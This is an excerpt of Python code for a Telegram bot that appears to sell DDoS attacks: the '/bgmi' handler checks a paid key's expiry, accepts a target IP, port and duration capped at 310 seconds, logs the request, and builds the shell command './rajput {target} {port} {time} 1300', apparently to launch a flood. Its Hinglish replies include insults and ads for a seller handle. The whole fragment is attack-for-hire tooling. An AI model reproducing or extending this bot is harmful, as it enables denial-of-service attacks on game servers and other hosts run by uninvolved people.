...
def handle_bgmi(message):
    ...
    if user_id in users:
        ...
        if datetime.datetime.now() > expiration_date:
            response = "❌ KEY KHATAM HO GAI NEW BUY KAE LE @RAJPUT_VIP_LODER❌ "
            bot.reply_to(message, response)
            return
        ...
        if len(command) == 4:
            ...
            try:
                ...
                time = int(command[3])
                if time > 310:
                    response = "⚠️𝐄𝐑𝐑𝐎𝐑:310 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
                else: 
                    record_command_logs(user_id, '/bgmi', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)
                    full_command = f"./rajput {target} {port} {time} 1300"
        ...
        response = "𝐁𝐒𝐃𝐊 𝐆𝐀𝐑𝐄𝐄𝐁 𝐀𝐂𝐂𝐄𝐒𝐒 𝐍𝐀𝐇𝐈 𝐇 𝐓𝐄𝐑𝐏𝐄 PHELE BUY KAR LE @RAJPUT_VIP_LODER"
